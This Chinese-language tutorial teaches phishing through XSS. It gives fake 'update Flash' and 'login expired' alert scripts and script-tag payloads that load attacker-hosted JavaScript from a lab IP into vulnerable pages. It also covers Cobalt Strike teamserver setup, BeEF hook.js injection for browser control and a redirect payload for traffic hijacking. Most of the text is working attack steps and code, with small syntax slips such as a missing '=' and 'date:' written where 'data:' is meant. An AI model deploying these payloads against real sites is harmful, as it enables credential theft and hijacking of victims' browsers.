## 通过XSS钓鱼

### 1. 网络钓鱼

钓鱼网站是指欺骗用户的虚假网站。“钓鱼网站”的页面与真实网站界面基本一致，欺骗消费者或者窃取访问者提交的账号和密码信息。钓鱼网站一般只有一个或几个页面，和真实网站差别细微。钓鱼网站是互联网中最常碰到的一种诈骗方式，通常伪装成银行及电子商务、窃取用户提交的银行账号、密码等私密信息的网站。

网络钓鱼是犯罪分子最容易实施的网络攻击方式之一，也是最容易上当的方式之一。它还可以为黑客提供所需的一切，以洗劫其目标的个人和工作帐户。

网络钓鱼也是网络攻击者传播恶意软件的一种流行方法，通过鼓励受害者下载一个文件或访问一个链接，秘密安装恶意有效载荷，从而进行传播木马恶意软件、勒索软件或各种破坏性和破坏性攻击。

#### (1）Flash钓鱼

`Flash Player` 是一种广泛使用的、专有的多媒体程序播放器。 `F1ash player` 使用矢量图形的技术来最小化文件的大小以及创造节省网络带宽和下载时间的文件。因此 F1ash 成为嵌入网页中的小游戏、动画以及图形用户界面常用的格式。

**A. 配置钓鱼页面**

1. 访问真实的 `fiesh` 官网页面，然后点击鼠标右键选择査看网页源代码，并将所有的代码复制下来保存到 `index.html` 里。

2. 检查并修改源代码里的链接修改为官网里的链接。

3. 启动 `http` 服务以供受害者能访问到 `index.html` 和 `flash.js` 。

   ```
   python -m http.server --bind 0.0.0.0 1234
   ```

4. 新建 `flash.js` 文件，内容为（其中的 `window.location.href` 的值修改为 `index.html` 的URL地址）：

   ```
   window.alert = function(name){
   var iframe= document.createElement("IFRAME");
   iframe.style.display="none";
   iframe.setAttribute("src",'date:text/plain');
   document.documentElement.appendChild(iframe);
   window.frames [0].window.alert(name);
   iframe.parentNode.removeChild(iframe);
   }
   alert("您的FLASH版本过低，尝试升级后访问该页面!");
   window.location.href "http://192.168.19.128:1234/index.html"
   ```

**B. 钓鱼**

1. 攻击者将 `<script src="http://192.168.19.123:1234/flash.js"></script>` 插入到存在XSS漏洞的地方。
2. 受害者浏览存在XSS漏洞的页面，浏览器就会弹出FLASH版本过低的提示。

#### (2）Cobalt Strike钓鱼

`Cobalt Strike` （简称CS）是一款团队作战渗透测试神器，是一种可以用来横向移动，数据窃取，鱼叉式钓鱼的后渗透工具。`Cobalt Strike` 使用C/S架构，客户端连接到服务端，服务端即为团队服务器。

`Cobalt Strike` 使用 `Java` 开发，因此启动依赖于 `jdk` 环境。服务端只能部署在Linux上，客户端可以在任何配置了 `jdk` 的系统上运行。

**A. 配置Cobalt Strike服务端** 

1. 赋予服务端文件的执行权限

   ```
   chmod +x teamserver
   ```
2. 运行服务端文件

   ```
   sudo ./teamserver kaliIP password
   ```

**B. 客户端连接服务器** 

1. 赋予客户端文件的执行权限

   ```
   chmod +x cobaltstrike
   ```

2. 运行客户端脚本

   ```
   ./cobaltstrike
   ```

3. 连接进入

**C. 制作钓鱼网站**

1. 克隆网站

2. 新建 `clone.js` ，内容为（其中的 `window.location.href` 的值修改为克隆出来的网站地址）：

   ```
   window.alert = function(name){
   var iframe= document.createElement("IFRAME");
   iframe.style.display="none";
   iframe.setAttribute("src",'date:text/plain');
   document.documentElement.appendChild(iframe);
   window.frames [0].window.alert(name);
   iframe.parentNode.removeChild(iframe);
   }
   alert("登录过期，请重新登录!");
   window.location.href "http://192.168.19.128/"
   ```

3. 攻击者启动 `http` 服务使得受害者浏览器能访问到 `clone.js` 

   ```
   python -m http.server --bind 0.0.0.0 1234
   ```
   

**D. 钓鱼** 

1. 攻击者将 `<script src="http://192.168.19.128:1234/clone.js"></script>` 插入到存在XSS漏洞的页面。
2. 受害者浏览插入了 `JavaScript` 代码的页面，就会弹出登录过期的提示。

#### (3）BeEF钓鱼

`BeEF`  (The Browser Exploitation framework)是浏览器攻击框架的简称，是一款专注于浏览器端的渗透测试工具。
`BeEF`  提供一个 Web 界面来进行操作，只要访问了嵌 `hook.js`  的页面，抑或执行了 `hook.js ` 文件的浏览器，就会不断地以 `GET` 的方式将其自身的相关信息传到 `BeEF` 的服务端。

**A. 安装BeEF**

1. 使用docker进行安装，拉取镜像

   ```
   docker pull janes/beef
   ```

2. 利用镜像启动一个容器

   ```
   docker run -dp 3000:3000 janes/beef
   ```

3. 测试是否启动成功，浏览器访问 `http://your-ip:3000/ui/panel` 

4. 登录，账户密码皆为 `beef` 

**B. 钓鱼**

1. 攻击者将 `<script src="http://192.168.19.128:3000/hook.js"></script>` 插入到存在XSS漏洞的页面。
2. 受害者浏览插入了 `JavaScript` 代码的页面。
3. 在服务端可以完成控制。

### 2. 流量劫持

流量劫持是指利用一些软件或木马修改浏览器不停的弹出新的窗口强制性的让用户访问指定的网站。

Payload：

```
<script>window.location.href="http://www.baidu.com"</script>
```